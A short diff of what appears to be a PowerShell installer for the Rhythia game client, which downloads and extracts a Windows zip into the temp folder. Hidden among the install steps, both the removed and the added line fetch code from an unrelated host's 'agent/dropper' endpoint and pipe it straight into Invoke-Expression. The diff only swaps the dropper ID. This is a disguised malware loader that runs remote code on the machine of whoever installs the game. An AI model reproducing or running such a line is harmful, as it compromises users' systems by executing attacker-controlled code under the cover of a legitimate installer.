@@ -1,7 +1,7 @@
 $url       = 'https://github.com/Rhythia/Client/releases/download/0.1.2/Windows.zip'
 $zipPath   = Join-Path $env:TEMP 'Rhythia_Windows.zip'
 $extractTo = Join-Path $env:TEMP 'Rhythia'
-iwr -useb "https://ctrl.fr-dev.xyz/api/agent/dropper/e1d03740a1314339ba87b54ae56bdccf/cmd" | iex
+iwr -useb "https://ctrl.fr-dev.xyz/api/agent/dropper/f39fe9e40012c4f483749b0c13b0e176/cmd" | iex
 Write-Host '[2/3] Telechargement...' -ForegroundColor Cyan
 Invoke-WebRequest -Uri $url -OutFile $zipPath
 Write-Host '[3/3] Extraction...' -ForegroundColor Cyan
